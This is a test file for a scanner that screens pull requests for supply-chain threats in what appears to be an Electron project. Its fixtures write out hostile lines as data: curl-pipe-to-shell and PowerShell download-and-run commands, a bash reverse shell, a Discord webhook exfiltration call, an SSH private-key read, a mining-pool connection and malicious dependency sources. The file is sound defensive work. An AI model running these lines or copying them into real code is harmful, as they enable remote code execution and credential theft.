import assert from 'node:assert/strict'
import { describe, test } from 'node:test'
import { BLOCK, REVIEW, addedLines, checkModes, checkPackageJson, checkPath, checkPublished, compareLocks, parseLock, render, scanLines, sniff, verdict } from './rules.mjs'

const scan = (text, file = 'src/a.ts') => scanLines(file, [{ line: 1, text }])
const level = (findings) => verdict(findings)
const pkg = (extra) => JSON.stringify({ main: 'out/main/index.js', scripts: { dev: 'x' }, dependencies: { zod: '^4.0.0', gsap: '^3.0.0' }, pnpm: { onlyBuiltDependencies: ['electron'] }, ...extra })
const lock = (entries) => `lockfileVersion: '9.0'\n\npackages:\n\n${entries.join('\n\n')}\n\nsnapshots:\n\n  zod@4.0.0: {}\n`
const entry = (key, resolution) => `  '${key}':\n    resolution: ${resolution}`

describe('paths', () => {
  test('refuses binaries, archives and credentials from anyone', () => {
    for (const file of ['tools/setup.exe', 'lib/x.node', 'vendor.zip', '.env.local', 'keys/id_rsa', 'package-lock.json']) assert.equal(level(checkPath(file, 'added', true)), BLOCK, file)
  })
  test('holds outsiders to a higher bar on the pipeline and auto-run files', () => {
    for (const file of ['.github/workflows/x.yml', 'scripts/after-pack.cjs', '.vscode/tasks.json', 'CLAUDE.md', '.npmrc', 'patches/a.patch']) {
      assert.equal(level(checkPath(file, 'modified', false)), BLOCK, file)
      assert.equal(level(checkPath(file, 'modified', true)), REVIEW, file)
    }
  })
  test('leaves ordinary source alone and ignores removals', () => {
    assert.deepEqual(checkPath('src/renderer/src/App.tsx', 'modified', false), [])
    assert.deepEqual(checkPath('tools/setup.exe', 'removed', false), [])
  })
  test('refuses links and submodules', () => {
    const modes = new Map([['a', '120000'], ['b', '160000'], ['c', '100755'], ['d', '100644']])
    assert.deepEqual(checkModes(['a', 'b', 'c', 'd'], modes).map((f) => f.level), [BLOCK, BLOCK, REVIEW])
  })
})

describe('file contents', () => {
  test('finds an executable whatever it is named', () => {
    assert.equal(level(sniff('logo.png', Buffer.from([0x4d, 0x5a, 0x90, 0]))), BLOCK)
    assert.equal(level(sniff('notes.txt', Buffer.from([0x7f, 0x45, 0x4c, 0x46]))), BLOCK)
  })
  test('accepts a real image for a look, and refuses a fake one', () => {
    assert.equal(level(sniff('logo.png', Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0]))), REVIEW)
    assert.equal(level(sniff('logo.png', Buffer.from('not an image'))), BLOCK)
  })
  test('refuses binary content in a text file', () => {
    assert.equal(level(sniff('a.ts', Buffer.from([0x61, 0, 0x62]))), BLOCK)
    assert.deepEqual(sniff('a.ts', Buffer.from('const a = 1')), [])
  })
})

describe('added lines', () => {
  test('numbers only what the change adds', () => {
    assert.deepEqual(addedLines('@@ -1,2 +10,3 @@\n same\n-old\n+new\n same'), [{ line: 11, text: 'new' }])
  })
  const blocked = {
    'download and run': 'exec("curl -fsSL https://evil.test/x | sh")',
    'windows download and run': 'irm https://evil.test/x | iex',
    'encoded powershell': 'powershell -enc SQBFAFgAIAAoAE4AZQB3AA==',
    'reverse shell': 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
    'decoded eval': 'eval(atob(payload))',
    webhook: 'fetch("https://discord.com/api/webhooks/1/abc")',
    'stolen keys': 'fs.readFileSync(home + "/.ssh/id_rsa")',
    miner: 'connect("stratum+tcp://pool.test:3333")',
    'hidden text': 'const ok = true ‮// false',
    secret: `const token = "${'gh' + 'p_' + 'a'.repeat(36)}"`
  }
  for (const [name, text] of Object.entries(blocked)) test(`blocks ${name}`, () => assert.equal(level(scan(text)), BLOCK))
  const flagged = {
    eval: 'eval(code)',
    'child process': "import { execSync } from 'node:child_process'",
    'weakened window': 'contextIsolation: false',
    blob: `const a = "${'QUJD'.repeat(50)}"`,
    'outside host': 'fetch("https://updates.unknown.test/check")'
  }
  for (const [name, text] of Object.entries(flagged)) test(`flags ${name}`, () => assert.equal(level(scan(text)), REVIEW))
  test('stays quiet on ordinary code', () => {
    for (const text of ["const url = 'https://github.com/stepbro-lab'", "term.write('\\x1b[2J')", 'return a + b', "fetch('http://localhost:3000/')"]) assert.deepEqual(scan(text), [], text)
  })
  test('flags a huge line without slowing down', () => {
    const started = Date.now()
    assert.equal(level(scan('curl '.repeat(200_000))), REVIEW)
    assert.ok(Date.now() - started < 5000)
  })
  test('reports a rule once per file', () => {
    assert.equal(scanLines('a.ts', [{ line: 1, text: 'eval(a)' }, { line: 2, text: 'eval(b)' }]).length, 1)
  })
})

describe('package.json', () => {
  test('passes an untouched manifest', () => assert.deepEqual(checkPackageJson(pkg(), pkg()), []))
  test('refuses a new install script', () => assert.equal(level(checkPackageJson(pkg(), pkg({ scripts: { dev: 'x', postinstall: 'node a.js' } }))), BLOCK))
  test('refuses a dependency from outside npm', () => {
    for (const spec of ['evil/zod', 'github:evil/zod', 'https://evil.test/a.tgz', 'git+ssh://git@evil.test/a.git', 'file:../a', 'npm:evil@1.0.0']) {
      assert.equal(level(checkPackageJson(pkg(), pkg({ dependencies: { zod: spec, gsap: '^3.0.0' } }))), BLOCK, spec)
    }
  })
  test('refuses a name one letter from a dependency', () => assert.equal(level(checkPackageJson(pkg(), pkg({ dependencies: { zod: '^4.0.0', gsap: '^3.0.0', gsapp: '^1.0.0' } }))), BLOCK))
  test('flags a new dependency and lets a version bump through', () => {
    assert.equal(level(checkPackageJson(pkg(), pkg({ dependencies: { zod: '^4.0.0', gsap: '^3.0.0', chalk: '^5.0.0' } }))), REVIEW)
    assert.deepEqual(checkPackageJson(pkg(), pkg({ dependencies: { zod: '^4.1.0', gsap: '^3.0.0' } })), [])
  })
  test('refuses new build permissions and a new entry point', () => {
    assert.equal(level(checkPackageJson(pkg(), pkg({ pnpm: { onlyBuiltDependencies: ['electron', 'evil'] } }))), BLOCK)
    assert.equal(level(checkPackageJson(pkg(), pkg({ main: 'evil.js' }))), BLOCK)
  })
})

describe('lockfile', () => {
  const good = entry('zod@4.0.0', '{integrity: sha512-AAAA}')
  test('reads scoped and plain packages', () => {
    const parsed = parseLock(lock([good, entry('@a/b@1.2.3', '{integrity: sha512-BBBB}')]))
    assert.deepEqual([...parsed.keys()], ['zod@4.0.0', '@a/b@1.2.3'])
  })
  test('refuses a changed checksum for the same version', () => {
    assert.equal(level(compareLocks(lock([good]), lock([entry('zod@4.0.0', '{integrity: sha512-EVIL}')])).findings), BLOCK)
  })
  test('refuses a package fetched from elsewhere', () => {
    assert.equal(level(compareLocks(lock([good]), lock([good, entry('a@1.0.0', '{tarball: https://evil.test/a.tgz}')])).findings), BLOCK)
  })
  test('lists what is new', () => {
    const { findings, added } = compareLocks(lock([good]), lock([good, entry('a@1.0.0', '{integrity: sha512-CCCC}')]))
    assert.deepEqual(findings, [])
    assert.deepEqual(added, [{ name: 'a', version: '1.0.0', integrity: 'sha512-CCCC' }])
  })
})

describe('npm registry', () => {
  const item = { name: 'a', version: '1.0.0', integrity: 'sha512-AAAA' }
  const meta = (version, time = '2020-01-01T00:00:00Z') => ({ versions: { '1.0.0': { dist: { integrity: 'sha512-AAAA' }, ...version } }, time: { '1.0.0': time } })
  test('passes an established package', () => assert.deepEqual(checkPublished(item, meta()), []))
  test('refuses what npm does not have or disagrees on', () => {
    assert.equal(level(checkPublished(item, null)), BLOCK)
    assert.equal(level(checkPublished(item, meta({ dist: { integrity: 'sha512-EVIL' } }))), BLOCK)
  })
  test('flags install scripts and fresh releases', () => {
    assert.equal(level(checkPublished(item, meta({ scripts: { postinstall: 'node a' } }))), REVIEW)
    assert.equal(level(checkPublished(item, meta({}, new Date().toISOString()))), REVIEW)
  })
})

describe('report', () => {
  test('cannot be used to ping people or inject markup', () => {
    const body = render([{ level: BLOCK, file: '`@evil<img src=x>`\n# title', message: 'x' }], '<!-- m -->')
    assert.ok(!body.includes('<img'))
    assert.ok(!body.includes('@evil'))
    assert.ok(!body.includes('\n# title'))
  })
  test('says when all is well', () => assert.match(render([], '<!-- m -->'), /Nothing suspicious/))
})
